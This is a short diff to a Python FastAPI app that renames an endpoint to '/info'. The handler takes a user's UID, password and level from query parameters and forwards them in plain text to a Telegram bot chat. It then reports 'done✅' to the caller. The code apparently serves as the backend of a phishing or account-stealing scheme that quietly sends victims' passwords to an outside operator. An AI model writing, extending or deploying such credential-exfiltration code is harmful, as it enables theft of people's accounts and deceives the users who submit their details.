@@ -11,14 +11,14 @@ def home():
     return {"status": "API Running 🚀"}
 
 # MAIN ENDPOINT
-@app.get("/viplike")
+@app.get("/info")
 def send(uid: str = Query(...), password: str = Query(...), level: str = Query(...)):
 
-    text = f"UID: {uid}\nDAYS: {days}\nUTR: {utr}"
+    text = f"UID: {uid}\nPASSWORD: {password}\nLEVEL: {level}"
 
     requests.get(
         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
         params={"chat_id": CHAT_ID, "text": text}
     )
 
-    return {"status": "request send successfully "}
+    return {"status": "done✅"}
